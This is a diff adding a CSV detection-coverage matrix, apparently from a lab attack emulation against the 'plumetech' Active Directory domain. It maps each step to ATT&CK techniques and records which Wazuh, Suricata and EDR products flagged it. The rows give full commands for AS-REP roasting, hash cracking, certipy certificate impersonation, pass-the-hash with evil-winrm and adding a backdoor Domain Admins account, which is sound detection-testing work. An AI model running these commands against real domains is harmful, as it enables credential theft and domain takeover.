@@ -1,0 +1,20 @@
+Time;Command/Tools;Tactic;Technique;Wazuh default;Wazuh custom;Suricata ET;Suricata Custom;Vendor B NIDS;Vendor A EDR;Vendor A EDR IDP
+N/A;hashcat, impacket, certipy-ad, evil-winrm;Resource Development;Obtain Capabilities: Exploits - T1588.005;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;;Initial Access;External Remote Services - T1133;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;;Initial Access;Valid Accounts - T1078;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;nmap;Reconnaissance;Network Service Discovery - T1046;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+N/A;nmap;Reconnaissance;Remote System Discovery - T1018;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:06;N/A;Reconnaissance;Search Victim-Owned Websites - T1594;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:06;N/A;Reconnaissance;Gather Victim Identity Information: Email Addresses - T1589.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:07;impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.0.6.11 'plumetech/';Credential Access;Steal or Forge Kerberos Tickets: AS-REP Roasting - T1558.004;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:08;hashcat -m 18200 ASREProastables.txt rockyou.txt;Credential Access;Brute Force: Password Cracking - T1110.002;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A;N/A,N/A
+N/A;powershell.exe;Execution;Command and Scripting Interpreter: PowerShell - T1059.001;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+N/A;Get-ADUser;Reconnaissance;Account Discovery: Domain Account - T1087.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+N/A;Get-ADUser;Reconnaissance;Permission Groups Discovery - T1069;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:13;"certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid ""S-1-5-21-514844351-3181471642-2638765006-1103""";Initial Access;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:13;"certipy-ad req -dc-ip 10.0.6.11 -u debbie@PLUMETECH.LOCAL -p '25800ellie' -template Smartcard -upn manuel@PLUMETECH.LOCAL -ca PLUMETECH-DC1-CA -target DC1.PLUMETECH.LOCAL -sid ""S-1-5-21-514844351-3181471642-2638765006-1103""";Credential Access;Steal or Forge Authentication Certificates - T1649;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;Technique,Informational
+16:14;certipy-ad auth -pfx manuel.pfx -dc-ip 10.0.6.11;Privilege Escalation;Valid Accounts - T1078;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:14;evil-winrm -i 10.0.6.11 -u manuel -H c7c1e58f57e5c784b78ab63a3546aaed;Lateral Movement;Use Alternate Authentication Material: Pass-the-Hash - T1550.002;Technique,Low;Technique,Low;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:14;evil-winrm -i 10.0.6.11 -u manuel -H c7c1e58f57e5c784b78ab63a3546aaed;Lateral Movement;Remote Services: Windows Remote Management - T1021.006;None,N/A;None,N/A;None,N/A;None,N/A;Technique,Medium;None,N/A;None,N/A
+16:15;"New-AdUser -Name 'plumber', Set-ADAccountPassword -Identity 'plumber' -NewPassword (ConvertTo-SecureString -AsPlainText ""qwertz"" -Force) -Reset, Enable-AdAccount -Identity plumber";Persistence;Create Account: Domain Account - T1136.002;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
+16:15;Add-ADGroupMember -Identity 'Domain Admins' -Members 'plumber';Persistence;Account Manipulation: Additional Local or Domain Groups - T1098.007;Technique,High;Technique,High;None,N/A;None,N/A;None,N/A;None,N/A;None,N/A
